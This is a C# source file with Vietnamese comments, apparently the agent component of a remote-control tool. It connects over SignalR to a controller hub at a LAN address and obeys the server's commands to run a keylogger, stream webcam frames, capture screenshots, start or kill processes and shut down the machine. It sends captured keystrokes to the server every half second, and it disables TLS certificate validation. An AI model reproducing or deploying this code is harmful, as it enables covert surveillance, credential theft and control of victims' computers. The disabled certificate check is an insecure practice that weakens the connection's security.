﻿// File: Services/Networking/SocketClient.cs
using Microsoft.AspNetCore.SignalR.Client;
using Microsoft.Extensions.Logging;
using RemoteControl.Agent.Models; // Dùng DTO chuẩn
using RemoteControl.Agent.Services.Input;
using RemoteControl.Agent.Services.Media;
using RemoteControl.Agent.Services.System; // Namespace chuẩn
using System.Text.Json;

namespace RemoteControl.Agent.Services.Networking
{
    public class SocketClient
    {
        private readonly HubConnection _hubConnection;
        private readonly ILogger<SocketClient> _logger;

        // Các Service xử lý
        private readonly ProcessHandler _processHandler;
        private readonly ScreenCapturer _screenCapturer;
        private readonly PowerHandler _powerHandler;
        private readonly Keylogger _keylogger;
        // 1. KHAI BÁO BIẾN ĐỂ CHỨA WEBCAM HANDLER
        private readonly WebcamHandler _webcamHandler;

        public SocketClient(
            ILogger<SocketClient> logger,
            ProcessHandler processHandler,
            ScreenCapturer screenCapturer,
            PowerHandler powerHandler,
            Keylogger keylogger,
            WebcamHandler webcamHandler)
        {
            _logger = logger;
            _processHandler = processHandler;
            _screenCapturer = screenCapturer;
            _powerHandler = powerHandler;
            _keylogger = keylogger;
            _webcamHandler = webcamHandler;

            // LƯU Ý: Thay đổi IP này thành IP máy thật của bạn nếu chạy trên máy ảo
            string serverUrl = "http://192.168.1.4:55512/controlhub";

            _hubConnection = new HubConnectionBuilder()
    .WithUrl(serverUrl, opts =>
    {
        // THÊM ĐOẠN NÀY ĐỂ BỎ QUA LỖI SSL
        opts.HttpMessageHandlerFactory = (handler) =>
        {
            if (handler is HttpClientHandler clientHandler)
            {
                clientHandler.ServerCertificateCustomValidationCallback =
                    (sender, certificate, chain, sslPolicyErrors) => true;
            }
            return handler;
        };
    })
    .WithAutomaticReconnect()
    .Build();

            RegisterHandlers();
        }

        private void RegisterHandlers()
        {
            _hubConnection.On<string>("ReceiveCommand", async (commandJson) =>
            {
                _logger.LogInformation($"Nhận lệnh từ Server: {commandJson}");
                try
                {
                    var cmd = JsonSerializer.Deserialize<CommandDto>(commandJson);
                    if (cmd == null) return;

                    switch (cmd.CommandType)
                    {
                        // --- XỬ LÝ APP & PROCESS ---
                        case "GET_APPS": // Lấy danh sách App có cửa sổ
                            var apps = _processHandler.GetRunningApps();
                            await SendData("APP_LIST", apps);
                            break;

                        case "START_APP": // Mở app mới
                                          // Payload ví dụ: "notepad" hoặc "C:\\Program Files\\..."
                            string result = _processHandler.StartApp(cmd.Payload);
                            // Có thể gửi thông báo về nếu cần
                            break;

                        // --- XỬ LÝ WEBCAM ---
                        case "START_WEBCAM":
                            // Payload là số giây muốn quay, ví dụ "5" hoặc "10"
                            if (int.TryParse(cmd.Payload, out int duration))
                            {
                                _logger.LogInformation($"Bắt đầu quay Webcam trong {duration} giây...");

                                // Gọi hàm quay webcam, truyền vào logic gửi dữ liệu
                                _ = _webcamHandler.StartStreamingAsync(duration, async (imgBytes) =>
                                {
                                    // Hàm này sẽ được WebcamHandler gọi mỗi khi có ảnh mới
                                    string base64Img = Convert.ToBase64String(imgBytes);
                                    await SendData("WEBCAM_FRAME", base64Img);
                                });
                            }
                            break;

                        case "STOP_WEBCAM":
                            _webcamHandler.StopStreaming();
                            break;
                        case "GET_PROCESS":
                            var processes = _processHandler.GetProcesses();
                            await SendData("PROCESS_LIST", processes);
                            break;

                        case "KILL_PROCESS":
                            if (int.TryParse(cmd.Payload, out int pid))
                                _processHandler.KillProcess(pid);
                            break;

                        case "CAPTURE_SCREEN":
                            var imgBytes = _screenCapturer.TakeScreenshot();
                            if (imgBytes.Length > 0)
                            {
                                string imgBase64 = Convert.ToBase64String(imgBytes);
                                await SendData("SCREENSHOT", imgBase64);
                            }
                            break;

                        case "SHUTDOWN":
                            _powerHandler.Shutdown();
                            break;

                        case "RESTART":
                            _powerHandler.Restart();
                            break;

                        case "START_KEYLOG":
                            _logger.LogInformation("Lệnh: Bắt đầu Keylog");
                            _keylogger.Start();
                            break;

                        case "STOP_KEYLOG":
                            _logger.LogInformation("Lệnh: Dừng Keylog");
                            _keylogger.Stop();
                            break;
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError($"Lỗi xử lý lệnh: {ex.Message}");
                }
            });
        }

        private async Task SendData(string dataType, object data)
        {
            if (_hubConnection.State == HubConnectionState.Connected)
            {
                var response = new ResponseDto
                {
                    AgentId = _hubConnection.ConnectionId ?? "Unknown",
                    DataType = dataType,
                    Data = data
                };
                await _hubConnection.SendAsync("SendDataFromAgent", response);
            }
        }

        public async Task ConnectAsync(CancellationToken token)
        {
            // Biến đếm để kiểm soát tốc độ chụp ảnh (tránh chụp quá nhanh gây lag)
            //int loopCount = 0;

            while (!token.IsCancellationRequested)
            {
                try
                {
                    // 1. Tự động kết nối lại nếu rớt mạng
                    if (_hubConnection.State == HubConnectionState.Disconnected)
                    {
                        await _hubConnection.StartAsync(token);
                        _logger.LogInformation(">>> AGENT ĐÃ KẾT NỐI TỚI CONTROL HUB!");
                    }

                    if (_hubConnection.State == HubConnectionState.Connected)
                    {
                        // 2. Gửi Keylog (Ưu tiên gửi nhanh - mỗi 0.5s)
                        if (_keylogger.IsRunning())
                        {
                            string logs = _keylogger.GetLogAndClear();
                            if (!string.IsNullOrEmpty(logs))
                            {
                                await SendData("KEYLOG_CHUNK", logs);
                            }
                        }
                        
                    }

                    // Nghỉ 0.5 giây rồi lặp lại vòng lặp
                    await Task.Delay(500, token);
                }
                catch (Exception ex)
                {
                    _logger.LogWarning($"Lỗi kết nối: {ex.Message}. Thử lại sau 3s...");
                    await Task.Delay(3000, token);
                }
            }
        }
    }
}